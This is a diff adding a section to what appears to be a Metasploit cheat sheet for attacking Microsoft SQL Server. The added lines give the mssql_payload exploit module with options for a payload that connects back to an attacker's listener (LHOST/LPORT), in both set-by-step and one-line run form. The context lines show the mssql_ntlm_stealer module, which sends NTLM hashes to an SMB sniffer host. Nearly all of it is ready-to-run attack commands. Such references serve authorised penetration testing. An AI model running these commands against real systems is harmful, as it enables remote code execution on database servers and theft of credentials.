@@ -100,3 +100,24 @@ run
 use admin/mssql/mssql_ntlm_stealer
 run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,SMBPROXY=<ip_of_smb_sniffer> <ip>
 ```
+
+#  Microsoft SQL Server payload execution
+## Options
+```ruby
+use exploit/windows/mssql/mssql_payload
+set RHOSTS <ip>
+set PASSWORD <password>
+set username <user>
+set domain <domain>
+set USE_WINDOWS_AUTHENT <true>
+set SRVHOST <handler_listen_ip>
+set SRVPORT <handler_listen_port>
+set LHOST <payload_connect_ip>
+set LPORT <payload_connect_port>
+```
+
+## Run
+```ruby
+use exploit/windows/mssql/mssql_payload
+run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_ip>,LPORT=<payload_connect_port> <ip>
+```
